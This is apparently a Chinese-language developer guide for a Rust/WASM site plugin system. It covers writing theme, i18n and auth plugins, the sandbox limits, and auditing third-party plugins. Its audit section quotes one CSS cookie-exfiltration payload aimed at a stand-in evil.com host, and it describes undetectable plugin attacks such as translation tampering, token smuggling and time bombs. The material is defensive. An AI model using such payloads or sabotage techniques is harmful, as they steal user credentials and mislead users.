# Plugin Development Guide

> 适用阶段：Phase 5（v2.1 Todos.md）。
> 30 分钟入门：从零写一个 WASM 插件、构建、部署到站点。
> ABI 规范见 [PLUGIN_ABI.md](PLUGIN_ABI.md)。

## 1. 准备

```bash
# Rust 工具链 + wasm32 target
rustup target add wasm32-unknown-unknown
```

如果你已经构建过本仓库的内置插件（`./scripts/build_themes.sh`），
target 已经就绪。

## 2. 项目骨架

新建 `crates/plugins/<your-name>/`：

```text
crates/plugins/theme-purple/
├── Cargo.toml
└── src/
    └── lib.rs
```

### 2.1 `Cargo.toml`

```toml
[package]
name = "theme-purple-plugin"
version = "0.1.0"
edition = "2021"

[lib]
crate-type = ["cdylib"]

[dependencies]
sdk = { path = "../../sdk" }
```

关键点：
- `name` 以 `-plugin` 结尾（与 build script 约定一致）。
- `crate-type = ["cdylib"]` 必填，否则不会输出 `.wasm` 产物。
- 依赖 `sdk` 拿到 `alloc/dealloc`、`pack_output`、`PluginManifest` 等辅助。

### 2.2 把 crate 加入 workspace

编辑根 `Cargo.toml`：

```toml
[workspace]
members = [
    # ... 其他 crates
    "crates/plugins/theme-purple",
]
```

## 3.0 为什么看不到 `unsafe`？（Phase 9.1）

`#[plugin_export]` 是一个 proc macro（`crates/sdk-macros`），把一个 safe
Rust fn 自动包装成 `unsafe extern "C" fn ... -> u64` 的 WASM ABI 入口。展开后
等价于以下手写 boilerplate：

```rust
// 你写的：
#[plugin_export]
fn get_theme_css() -> &'static str { THEME_CSS }

// 宏展开为（简化）：
fn __plugin_inner_get_theme_css() -> &'static str { THEME_CSS }

#[no_mangle]
pub unsafe extern "C" fn get_theme_css(ptr: *mut u8, len: usize) -> u64 {
    let _ = (ptr, len);
    let result = __plugin_inner_get_theme_css();
    sdk::pack_output(result.as_bytes().to_vec())
}
```

宏支持 0 或 1 参数；返回类型按 syntax 自动分派：
- `String` / `&str` → `pack_output(bytes)`
- `Vec<u8>` → `pack_output`
- 任何 `Serialize` 类型（含 `PluginManifest`）→ `pack_json(&v)`

不支持 `Result<T, E>`（v1）；错误请在 fn 内自己编码进返回 JSON。
不支持 async / unsafe / method —— 编译期报错。

## 3. 最小可行实现（主题插件）

`crates/plugins/theme-purple/src/lib.rs`：

```rust
use sdk::{capabilities, plugin_export, PluginManifest};

#[plugin_export]
fn get_manifest() -> PluginManifest {
    PluginManifest::new("theme-purple", "Theme Purple", env!("CARGO_PKG_VERSION"))
        .with_capability(capabilities::THEME)
        .with_description("紫罗兰主题（示例）")
        .with_author("yuxuetr")
}

const THEME_CSS: &str = r#"
:root {
  --color-primary: #7c3aed;
  --color-bg: #faf5ff;
  --color-surface: #f3e8ff;
  --color-text: #1e1b4b;
  --color-text-muted: #4c1d95;
  --color-border: #ddd6fe;
}
.dark {
  --color-primary: #a78bfa;
  --color-bg: #1e1b4b;
  --color-surface: #312e81;
  --color-text: #ede9fe;
  --color-text-muted: #c4b5fd;
  --color-border: #4338ca;
}
body { background-color: var(--color-bg) !important; color: var(--color-text) !important; }
"#;

#[plugin_export]
fn get_theme_css() -> &'static str { THEME_CSS }
```

就这样，~12 行 + 一段 CSS 实现一个完整主题。**视觉上 0 个 unsafe**。

## 4. 构建

```bash
CARGO_TARGET_DIR=/Users/hal/.target cargo build \
    -p theme-purple-plugin \
    --target wasm32-unknown-unknown \
    --release
```

产物在：
```
/Users/hal/.target/wasm32-unknown-unknown/release/theme_purple_plugin.wasm
```

注意 crate 名 `theme-purple-plugin` 在产物中变为 `theme_purple_plugin.wasm`
（下划线）— wasm 工具链统一约定。

## 5. 部署到站点

```bash
cp /Users/hal/.target/wasm32-unknown-unknown/release/theme_purple_plugin.wasm \
   assets/plugins/
```

然后编辑 `assets/site.json` 启用：

```jsonc
{
  "themes": ["theme_purple_plugin.wasm"],
  "_themes_available": [
    "theme_ocean_plugin.wasm",
    "theme_sunset_plugin.wasm",
    "theme_catppuccin_plugin.wasm",
    "theme_purple_plugin.wasm"     // ← 新增
  ]
}
```

重启 dev server 或刷新页面 — 主题立即生效。
ThemePicker 会自动通过 `list_available_themes` 扫到新插件
（manifest capability=`theme` 匹配）。

## 6. 其他 Capability 模板

### 6.1 i18n 插件

`get_manifest` 返回 capability=`i18n`，并实现 `translate`：

```rust
use sdk::{capabilities, plugin_export, PluginManifest};
use serde::Deserialize;

#[plugin_export]
fn get_manifest() -> PluginManifest {
    PluginManifest::new("i18n-fluent", "i18n Fluent", env!("CARGO_PKG_VERSION"))
        .with_capability(capabilities::I18N)
}

#[derive(Deserialize, Default)]
struct TranslateRequest {
    #[serde(default)]
    key: String,
    #[serde(default)]
    lang: String,
}

#[plugin_export]
fn translate(req: TranslateRequest) -> String {
    match (req.key.as_str(), req.lang.as_str()) {
        ("nav-blog", "en") => "Blog".into(),
        ("nav-blog", _)    => "博客".into(),
        _ => req.key,
    }
}
```

完整带 Fluent 解析的样例见 `crates/plugins/i18n-fluent/src/lib.rs`。

### 6.2 Auth 插件

完整模板看 `crates/plugins/github-auth/src/lib.rs`。核心导出：

- `get_config` → `AuthProviderConfig` JSON（OAuth endpoints + scopes + PKCE flag）
- `get_display_info` → `AuthProviderDisplay` JSON（名字 + 图标 + 品牌色）
- `exchange_code` → 把 `code` 换 access_token（插件内 raw HTTP 形态序列化为 JSON 让宿主代发请求）
- `fetch_profile` → 解析 profile 返回 `StandardUser` JSON

宿主负责真实 HTTP 调用、cookie、JWT 等；插件只做数据 mapping。

### 6.3 Moderation 插件（Phase 4.3 计划）

ABI 待定。预期导出：

- `get_endpoint` → API URL + headers
- `map_request(content)` → API request body JSON
- `map_verdict(api_response)` → `Verdict` JSON

详见 [MODERATION_SPEC.md](MODERATION_SPEC.md)。

## 7. 调试技巧

### 7.1 本地测试导出函数

WASM 是 sandbox 的，传统调试器不可用。常见做法：

1. **把核心逻辑提取为普通 fn**（不带 `#[no_mangle]`），用 `cargo test` 跑单测。
2. WASM 入口（`extern "C"`）只做「解析输入 → 调核心 fn → 打包输出」三件事。

示例：

```rust
fn translate_core(key: &str, lang: &str) -> &'static str { /* ... */ }

#[cfg(test)]
mod tests {
    use super::*;
    #[test]
    fn translate_nav_blog_en() {
        assert_eq!(translate_core("nav-blog", "en"), "Blog");
    }
}

#[no_mangle]
pub unsafe extern "C" fn translate(ptr: *mut u8, len: usize) -> u64 {
    // ... 解析 input ...
    let out = translate_core(key, lang);
    pack_output(out.as_bytes().to_vec())
}
```

### 7.2 查看 wasm 体积

```bash
ls -lh assets/plugins/your_plugin.wasm
```

参考：内置主题 ~26 KB；i18n ~80 KB；auth ~50 KB。
超过 200 KB 通常意味着不必要的依赖被打包，可用 `cargo bloat --target wasm32-unknown-unknown -p your-plugin` 排查。

### 7.3 错误：宿主拒绝加载

| 错误信息 | 原因 | 修复 |
| --- | --- | --- |
| `ABI not compatible` | `abi_version != 1` | 用 `PluginManifest::new(...)` 而非手填 |
| `plugin output exceeds limit` | 返回 > 8 MiB | 削减输出 / 调 `with_output_limit` |
| `module has no memory export` | 缺 `crate-type = ["cdylib"]` | 检查 Cargo.toml |
| `function "X" not found` | 函数名拼错 / 缺 `#[no_mangle]` | 加 `#[no_mangle] pub extern "C"` |

## 8. CI / 一键脚本

如果是主题插件，可以加进 `scripts/build_themes.sh`：

```bash
ALL_THEMES=(
    "theme-ocean-plugin:theme_ocean_plugin.wasm"
    "theme-sunset-plugin:theme_sunset_plugin.wasm"
    "theme-catppuccin-plugin:theme_catppuccin_plugin.wasm"
    "theme-purple-plugin:theme_purple_plugin.wasm"   # ← 新增
)
```

非主题插件按同样模式写自己的 build 脚本。

## 9. 发布清单

新插件 PR 前自检：

- [ ] `cargo build --target wasm32-unknown-unknown --release -p <plugin>` 通过
- [ ] `cargo test -p <plugin>` 通过（如有单测）
- [ ] manifest 中 capability 正确且 `abi_version == 1`
- [ ] 产物体积合理（主题 < 50 KB / Auth < 100 KB / 其他参考既有插件）
- [ ] 站点 `site.json` 已加入相应字段
- [ ] 在 `docs/` 中补一段 README / 截图（可选）

## 9.1 沙箱约束（Phase 8.1）

宿主对每次 wasm 调用施加四道防线，插件作者编码时需要心里有数：

| 维度 | 默认 | 覆盖 env | 说明 |
| --- | --- | --- | --- |
| Fuel（指令额度） | `100_000_000` ≈ 1s 内核活动 | `WASM_FUEL_LIMIT` | wasmi `Config::consume_fuel(true)` + `Store::set_fuel`，死循环会 trap |
| 线性内存 | 128 页 = 8 MiB | `WASM_MEMORY_PAGES` | `StoreLimitsBuilder::memory_size`；插件 `memory.grow` 超过即 -1 |
| 输出长度上限 | 8 MiB | `WASM_OUTPUT_LIMIT` | host 在 `vec![0u8; len]` 前 clamp；超额直接报错而非截断 |
| 单次调用 timeout | 5s | `WASM_INVOKE_TIMEOUT_SECS` | tokio 兜底；任何 wasmi 调用都跑在 `spawn_blocking` 工作池，timeout 优先释放调度器 |

实践指导：

- 不要在 `start`（构造函数）里跑长循环 —— 加载时就走 fuel
- 输出大概率在 KB 级；若上得了 MB 量级，请评估 `OUTPUT_LIMIT` 是否需要在部署侧上调
- 任何外部 import（host functions）目前**未提供** —— 插件是纯计算 + 字符串 I/O，遇到需要 IO 的场景请回到 host 端实现
- 校验阶段（`admin_upload_plugin`）也同样跑在沙箱内，恶意 `start` 不会卡住上传流程

## 10. 后续阶段（Phase 5+）

- **Hot Reload**：admin 上传 wasm → PluginEngine `invalidate` → 替换。完成后无需重启 server。
- **`/plugins` 浏览页**：从 `assets/plugins/registry.json` 拉清单，提供作者元信息 + 一键启用按钮（Phase 5.5）。
- **签名 / 校验**：上传 wasm 时校验 SHA256 + 可选 Ed25519 签名（Phase 7）。

## 11. 参考

- [PLUGIN_ABI.md](PLUGIN_ABI.md)：完整 ABI 规范
- [crates/sdk/src/lib.rs](../crates/sdk/src/lib.rs)：SDK 源码（~200 行，可一口气读完）
- [crates/sdk-macros/src/lib.rs](../crates/sdk-macros/src/lib.rs)：`#[plugin_export]` 宏实现（~200 行 syn + quote）
- [crates/plugins/theme-ocean/src/lib.rs](../crates/plugins/theme-ocean/src/lib.rs)：最简单的主题插件实现
- [crates/plugins/i18n-fluent/src/lib.rs](../crates/plugins/i18n-fluent/src/lib.rs)：用 `#[plugin_export]` 的 i18n 插件
- [crates/plugins/github-auth/src/lib.rs](../crates/plugins/github-auth/src/lib.rs)：完整 Auth 插件实现
- [THEME_SPEC.md](THEME_SPEC.md) / [MODERATION_SPEC.md](MODERATION_SPEC.md)：各能力的详细规范

## 12. 如何审计第三方插件（Phase 9.2 / 9.5）

> Fork 这个项目后，如果你接受外部贡献的插件 PR、或从社区安装 `.wasm` 文件，
> 必须知道宿主自动挡了什么、还要靠你人工 review 什么。

### 12.1 沙箱已挡住的（Phase 8.1 + 9.2，**物理隔离，无需信任**）

| 攻击 | 防线 |
|---|---|
| 死循环卡 worker | wasmi `fuel` 上限（默认 100M 指令） + tokio timeout 5s |
| 爆内存 | wasmi memory page cap（默认 128 页 = 8 MiB） |
| 输出炸弹（返回 `len = u32::MAX`） | host 在 `vec![0u8; len]` 前 clamp |
| 偷文件 / 上网 / 读 env | **宿主未暴露任何 host fn**，wasm 物理上做不到（imports 白名单 = ∅，任何 import 即拒） |
| 文件被偷换 | site.json `plugins_lock` SHA256 比对，不匹配拒绝加载 |
| capability 伪装（声明 theme 实际偷偷导出 `exchange_code`） | `verify_manifest_consistency` 校验声明 capability 必备 export 齐全 |
| theme CSS 注入数据外渗（`background:url(http://evil.com/?cookie=...)` 等） | `sanitize_theme_css` 黑名单字符串扫描，命中整段跳过 |

→ 即使第三方插件**全是恶意的**，上述场景在你 fork 的实例里都进不来。

### 12.2 永远检测不了的（**必须人工 review 源码**）

| 攻击 | 为什么检测不了 |
|---|---|
| **i18n 翻译篡改**："账户已锁定" → 翻译为"账户安全"误导用户 | wasm 字节码完全合法，逻辑上无法判断对错 |
| **Auth 插件偷塞额外字段**到 `StandardUser.raw_data`（多塞一个 token） | JSON shape 合法，宿主无法判断字段是否多余 |
| **时间炸弹**："装好 30 天后开始返错误数据 / 失败拒登" | 沙箱内合法运算，没法静态识别 |
| **概率性作恶**：每 1000 次调用故意返回错误 1 次 | 单次执行完全正常 |

### 12.3 信任链建议（fork 用户必读）

1. **只信任你自己签名的插件 + 你 review 过 source 的插件**
   - 仓库内置的 8 个插件（theme-ocean / sunset / catppuccin / i18n-fluent / 4 个 auth）source 都在 `crates/plugins/`
2. **外部社区插件 PR 流程**：把 source 也加进 `crates/plugins/<name>/`（不只是 `.wasm`）
   - PR review 必须读完插件 source
   - merge 后由你的 CI 重新 build 出 `.wasm`，不直接信任 PR 提交者打包的二进制
3. **`assets/plugins/` 收到第三方 `.wasm`**：拒绝接受
   - 没有 source 等于黑盒，沙箱挡不住逻辑攻击
4. **每次发布前跑一遍 lock 工具**重算 SHA256 写回 site.json，挡发布后的文件篡改

### 12.4 如果你想信任更多

未来如果你接受预编译的第三方 `.wasm`（例如做插件市场），需要补：

- Ed25519 detached 签名 + 多公钥 trust list（Phase 9.2 设计有提及但暂未实现）
- 第三方插件 disclosure + audit 流程
- Reproducible build（保证 source ↔ wasm 一一对应）

目前 fork 模式下用不到，等真有需求再回头加。
